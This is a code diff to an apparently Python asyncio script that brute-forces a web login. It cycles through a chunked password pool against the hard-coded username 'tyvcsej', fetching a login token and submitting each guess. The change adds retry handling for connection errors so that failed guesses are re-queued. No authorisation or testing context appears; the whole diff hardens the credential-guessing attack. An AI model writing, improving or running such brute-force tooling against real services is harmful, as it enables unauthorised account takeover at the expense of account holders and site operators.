@@ -6,6 +6,7 @@ import math
 from pathlib import Path
 
 import aiohttp
+from aiohttp.client_exceptions import ClientOSError
 import asyncio
 import uvloop
 
@@ -73,15 +74,26 @@ async def main(password_pool, n):
     password_group = chunks(password_pool, n)
 
     async def task(_passwords: list) -> bool:
+        def try_again(_pwd: str):
+            _passwords.append(_pwd)
+
         session = aiohttp.ClientSession()
         for _password in _passwords:
-            headers, _token = await go2login(session)
-            if headers is None:
-                _passwords.append(_password)
+            try:
+                headers, _token = await go2login(session)
+            except ClientOSError:
+                try_again(_password)
                 continue
-            result = await do_login(session, headers, _token, "tyvcsej", _password)
+            if headers is None:
+                try_again(_password)
+                continue
+            try:
+                result = await do_login(session, headers, _token, "tyvcsej", _password)
+            except ClientOSError:
+                try_again(_password)
+                continue
             if result is None:
-                _passwords.append(_password)
+                try_again(_password)
                 continue
             if result is True:
                 return True
